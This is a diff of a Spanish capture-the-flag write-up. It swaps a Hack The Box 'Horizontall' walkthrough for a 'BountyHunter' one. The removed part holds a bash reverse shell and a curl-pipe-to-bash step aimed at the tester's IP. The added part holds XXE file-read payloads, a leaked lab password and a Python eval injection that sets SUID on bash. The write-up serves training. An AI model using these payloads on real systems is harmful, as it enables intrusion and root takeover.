@@ -1,158 +1,235 @@
 ---
 layout: single
-title: Horizontall - Hack The Box
-excerpt: "Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the `Strapi Headless CMS` which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the `strapi` user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as `root`. " 
-date: 2024-02-24
+title: BountyHunter - Hack The Box
+excerpt: "BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell. "
+date: 2024-04-18
 classes: wide
 header:
-  teaser: /assets/images/htb-horizontall/Horizontall.png
+  teaser: /assets/images/htb-bounty/bounty.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
   - hackthebox
 tags:  
-  - Pkexec
-  - Strapi
-  - Directorios
+  - XML
+  - PHP
+  - Script
+  - XXE
 ---
 
-![](/assets/images/htb-horizontall/Horizontall.png)
+![](/assets/images/htb-bounty/bounty.png)
 
-Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the `Strapi Headless CMS` which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the `strapi` user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as `root`. 
+BountyHunter is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell. 
 
 ## Portscan
 
 ```
-Ricart0@kali:/home/kali/HTB/Horizontall/nmap -> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.11.105 -oG allports
-[sudo] contraseña para kali: 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 23:30 CET
-Initiating Ping Scan at 23:30
-Scanning 10.10.11.105 [4 ports]
-Completed Ping Scan at 23:30, 0.06s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 23:30
-Scanning 10.10.11.105 [65535 ports]
-Discovered open port 80/tcp on 10.10.11.105
-Discovered open port 22/tcp on 10.10.11.105
-Completed SYN Stealth Scan at 23:30, 12.20s elapsed (65535 total ports)
-Nmap scan report for 10.10.11.105
-Host is up, received echo-reply ttl 63 (0.071s latency).
-Scanned at 2024-02-21 23:30:41 CET for 12s
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
-           Raw packets sent: 65841 (2.897MB) | Rcvd: 65841 (2.634MB)
+# Nmap 7.94SVN scan initiated Sun Apr 14 18:27:12 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allPorts 10.10.11.100
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.100 ()	Status: Up
+Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
+# Nmap done at Sun Apr 14 18:27:25 2024 -- 1 IP address (1 host up) scanned in 12.67 seconds
 
 ```
 Y con esto analizamos los puertos abiertos:
 ```
-Ricart0@kali:/home/kali/HTB/Horizontall/nmap -> nmap -sCV -p22,80 10.10.11.105 -oN targeted
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 23:34 CET
-Nmap scan report for 10.10.11.105
-Host is up (0.053s latency).
+# Nmap 7.94SVN scan initiated Sun Apr 14 18:28:12 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.100
+Nmap scan report for 10.10.11.100
+Host is up (0.076s latency).
 
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
-|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
-|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
-80/tcp open  http    nginx 1.14.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://horizontall.htb
-|_http-server-header: nginx/1.14.0 (Ubuntu)
+|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
+|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
+|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Bounty Hunters
+|_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
-```
-## Directorios existentes
-
-Obtenemos del escaneo de puertos la url de http://horizontall.htb, asi que vamos a adentrarnos a ver que tiene, y vemos que no hay nada que explotar, por tanto, vamos a buscar directorios existentes de la página web a ver si podemos encontrar algo: 
-```
-Dirsearch started Wed Feb 21 23:52:50 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://horizontall.htb/
-
-301   194B   http://horizontall.htb/js    -> REDIRECTS TO: http://horizontall.htb/js/
-301   194B   http://horizontall.htb/css    -> REDIRECTS TO: http://horizontall.htb/css/
-200     4KB  http://horizontall.htb/favicon.ico
-301   194B   http://horizontall.htb/img    -> REDIRECTS TO: http://horizontall.htb/img/
-403   580B   http://horizontall.htb/js/
-```
-Comprobamos su contenido y no deja entrar en ningun directorio.
-Asi que lanzamos un curl a la url de tipo get para analizar el contenido de la pagina y posibles urls en el código, lo filtramos para que nos muestre lo que hay entre comillas '".*?"' y que contienen app, tambien que no se repita ningun resultado:
-```
-Ricart0@kali:/home/kali/HTB/Horizontall -> curl -s -X GET "http://horizontall.htb/" | grep -oP '".*?"' | grep app\. | sort -u
-"app"
-"/css/app.0f40a091.css"
-"/js/app.c68eb462.js"
-```
-Ahora si, en el contenido de "/js/app.c68eb462.js", encontramos contenido, asi que volvermos a filtrar por comillas,  en busca de una url, y filtramos por http para encontrar url's.
+# Nmap done at Sun Apr 14 18:28:23 2024 -- 1 IP address (1 host up) scanned in 10.85 seconds
 
 ```
-curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep -oP '".*?"' | grep http | sort -u                                                                 130 ⨯
-"http://api-prod.horizontall.htb/reviews"
-"https://horizontall.htb"
-"http://www.w3.org/2000/svg"
+## Analisis Web
+
+Analizando la página vemos que nos puede llevar a un lugar donde poder introducir información y verla reflejada asi que vamos a capturar la petición con el burpsuite.
+![](/assets/images/htb-bounty/pag1.png)
+
+
+Aqui esta lo que tenemos en el burp
+![](/assets/images/htb-bounty/burp1.png)
+
+Vemos que tenemos una data en base64 asi que vamos a meterla en el decoder para ver que tenemos, esto nos da una peticion en php. Vamos a intentar hacer un XXE injection en php:
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+y donde queramos meterlo ponemos:
+<title>&xxe;</title>
+```
+Lo encodeamos y lo ponemos de tipo url, probamos y nos da la respuesta que queremos asi que podemos probar mas inyecciones.
+Antes de todo vamos a buscar un posible directorio de tipo .php
+```
+sudo wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php
+000000848:   200        0 L      0 W        0 Ch        "db"   
 ```
 
-## Página web
-
-Encontramos esta url que parece tener contenido "http://api-prod.horizontall.htb/reviews", asi que la añadimos a /etc/hosts y buscamos en el navegador.
-
-Una vez sabido esto, podemos volver a hacer una búsqueda de directorios como antes, en la nueva pagina web. Esto nos devuelve que existe un directorio /admin, que si ejecutamos en el navegador nos lleva a un panel de autenticación:
-
-![](/assets/images/htb-horizontall/pagina1.png)
-
-Como vemos es un strapi, asi que vamos a buscar posibles sploits para ejecutar:
+Ahora vamos a probarlo en el XXE injection:
 ```
-Ricart0@kali:/home/kali/HTB/Horizontall -> searchsploit strapi                                                    
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                 | multiple/webapps/50237.py
-Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                               | multiple/webapps/50238.py
-Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                         | multiple/webapps/50239.py
-Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                           | nodejs/webapps/50716.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>hi</cwe>
+		<cvss>hi</cvss>
+		<reward>hi</reward>
+		</bugreport>
 ```
-
-## Intrusión
-Tenemos un sploit para la ocasion en la que no estamos autenticados, lo vamos a usar:
-![](/assets/images/htb-horizontall/int1.png)
-
-Ya tendriamos ejecucion de comandos, asi que vamos a intentar montarnos una reverse shell mandando un curl a nuestra ip, montandonos un servidor en python3 y escuchando por el puerto 443. Creamos un index.html que devuelva una bash:
+Esto nos devuelve un codigo en base64 que vamos a decodear en la terminal:
 ```
-Ricart0@kali:/home/kali/HTB/Horizontall/exploits -> cat index.html         
-#!/bin/bash
+ echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
 
-bash -i >& /dev/tcp/10.10.16.6/443 0>&1 
 ```
-Y ahora mandamos un curl y que lo interprete con bash: curl http://10.10.16.6/ | bash
-Y nos montamos el servidor en python(python3 -m http.server 80) y escucha por el puerto 443(nc -nvlp 443). Y estamos dentro:
-![](/assets/images/htb-horizontall/int2.png)
+Vamos a probar la contraseña que nos ha dado entrando en ssh:
+```
+ssh development@10.10.11.100                                                                   130 ⨯
+development@10.10.11.100's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 17 Apr 2024 03:00:45 PM UTC
+
+  System load:           0.0
+  Usage of /:            24.3% of 6.83GB
+  Memory usage:          14%
+  Swap usage:            0%
+  Processes:             215
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.100
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:c391
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
+development@bountyhunter:~$
+```
+ 
+Ahora ya estamos dentro y podemos acceder a la flag de usuario
 
 ## Escalada de privilegios
 
-En el directorio home encontramos la flag del usuario:
+Ahora toca escalar privilegios para obtener la flag de root. 
+Con sudo -l vemos que tenemos permiso para ejecutar un script en python3
 ```
-strapi@horizontall:/home/developer$ cat user.txt
-cat user.txt
-a3eb4b24b2c7c90ec8bfcde966163c55
+sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+
 ```
-Ahora toca escalar privilegios para obtener la flag de root. Vemos que pkexec se ecuentra disponible, muy vulnerable:
+Vamos a ver el contenido de este script:
+
 ```
-strapi@horizontall:~/myapi/config/environments/development$ which pkexec
-which pkexec
-/usr/bin/pkexec
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+
 ```
-Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos (zip -r comprimido.zip CVE-2021-4034). Desde el equipo de la víctima, obtenemos el zip de nuestro equipo(wget http://10.10.16.6/comprimido.zip). Lo descomprimimos, hacemos make, y lo ejecutamos:
+Con esto analizandolo vemos que tenemos que introducir un archivo de tipo .md necesariamente, y mas requisitos.
+Un posible contenido de nuestro archivo podria ser el siguiente:
 ```
-strapi@horizontall:~/myapi/config/environments/development/CVE-2021-4034$ ./cve-2021-4034
-<ronments/development/CVE-2021-4034$ ./cve-2021-4034                      
-whoami
+# Skytrain Inc
+## Ticket to 
+** 11 + 2 
+```
+
+Y para intrucir un script malicioso podemos poner:
+```
+# Skytrain Inc
+## Ticket to  
+** 11 + 2  __import__('os').system('chmod u+s /bin/bash')
+```
+
+Esto si ejecutamos lo siguiente ya lo tendriamos:
+```
+sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/hola.md
+Destination: 
+Invalid ticket.
+development@bountyhunter:/tmp$ bash -p
+bash-5.0# whoami
 root
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+c647c549364f46534d4d74db2ed2b828
+
 ```
-A partir de ahi, buscamos la flag de root y ya lo tenemos. 
+
